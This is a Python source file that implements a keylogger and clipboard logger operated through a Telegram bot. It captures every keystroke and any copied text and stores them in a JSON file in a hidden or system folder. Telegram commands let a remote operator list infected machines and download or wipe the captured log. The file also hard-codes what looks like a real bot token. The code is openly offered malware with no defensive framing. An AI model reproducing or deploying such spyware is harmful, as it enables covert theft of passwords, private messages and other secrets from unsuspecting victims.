import os
import json
import pyperclip
from pynput import keyboard
from datetime import datetime, timedelta
import platform
import time
from threading import Thread
from telegram import Update, Bot
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import logging

# Telegram Bot Token
TELEGRAM_BOT_TOKEN = "7633258412:AAGFGEgmR6MagBUXOwbdCxTVHhfRryA5OPs"
bot = Bot(TELEGRAM_BOT_TOKEN)

# Logging Setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Paths and Initialization
json_file_path = os.path.join(
    os.environ['ProgramData'] if os.name == 'nt' else os.path.expanduser('~/.hidden_dir'), 
    'keylog.json'
)
os.makedirs(os.path.dirname(json_file_path), exist_ok=True)
if not os.path.exists(json_file_path):
    with open(json_file_path, 'w') as file:
        json.dump([], file)

# Global Variables
devices = {}  # Tracks all devices: {device_id: {'name': str, 'last_seen': datetime}}
selected_device = None
device_id = platform.node()

# Utility Functions
def update_json(data): 
    with open(json_file_path, 'w') as file:
        json.dump(data, file, indent=4)

def load_json():
    with open(json_file_path, 'r') as file:
        return json.load(file)

def log_event(key):
    data = load_json()
    data.append({'timestamp': str(datetime.now()), 'key': str(key).replace("'", "")})
    update_json(data)

# Device Registration
def register_device():
    devices[device_id] = {
        'name': f"{platform.node()} ({platform.system()} {platform.release()})",
        'last_seen': datetime.now()
    }

def update_heartbeat():
    if device_id in devices:
        devices[device_id]['last_seen'] = datetime.now()

def cleanup_devices():
    """Remove devices not seen in the last 60 seconds."""
    threshold = datetime.now() - timedelta(seconds=60)
    offline_devices = [key for key, val in devices.items() if val['last_seen'] < threshold]
    for key in offline_devices:
        del devices[key]

# Telegram Command Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cleanup_devices()
    device_list = "\n".join(
        [f"{i+1}. {info['name']}" for i, (key, info) in enumerate(devices.items())]
    )
    instructions = (
        "Commands:\n/start - List online devices\n/select <num> - Select a device\n"
        "/unselect - Unselect the device\n/get - Get log\n/clear - Clear log\n\n"
        "Online Devices:\n" + (device_list if device_list else "No devices online.")
    )
    await update.message.reply_text(instructions)

async def select_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global selected_device
    try:
        device_index = int(context.args[0]) - 1
        selected_device = list(devices.keys())[device_index]
        await update.message.reply_text(f"Selected {devices[selected_device]['name']}")
    except (IndexError, ValueError):
        await update.message.reply_text("Invalid selection")

async def unselect_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global selected_device
    selected_device = None
    await update.message.reply_text("Device unselected")

async def get_json(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if selected_device and os.path.exists(json_file_path):
        await update.message.reply_document(open(json_file_path, 'rb'))
    else:
        await update.message.reply_text("No device selected or log missing.")

async def clear_json(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if selected_device:
        update_json([])
        await update.message.reply_text("JSON log reset.")
    else:
        await update.message.reply_text("No device selected")

# Keyboard Listener
keyboard.Listener(on_press=lambda key: log_event(key)).start()

# Clipboard Logger
def clipboard_loop():
    last_clipboard_content = None
    while True:
        clipboard_data = pyperclip.paste()
        if clipboard_data != last_clipboard_content and clipboard_data:
            data = load_json()
            data.append({'timestamp': str(datetime.now()), 'copied': clipboard_data})
            update_json(data)
            last_clipboard_content = clipboard_data
        time.sleep(5)

# Heartbeat Loop
def heartbeat_loop():
    while True:
        update_heartbeat()
        time.sleep(30)

# Telegram Bot Setup
def main():
    register_device()
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("select", select_device))
    app.add_handler(CommandHandler("unselect", unselect_device))
    app.add_handler(CommandHandler("get", get_json))
    app.add_handler(CommandHandler("clear", clear_json))

    Thread(target=heartbeat_loop, daemon=True).start()
    Thread(target=clipboard_loop, daemon=True).start()

    app.run_polling()

if __name__ == '__main__':
    main()
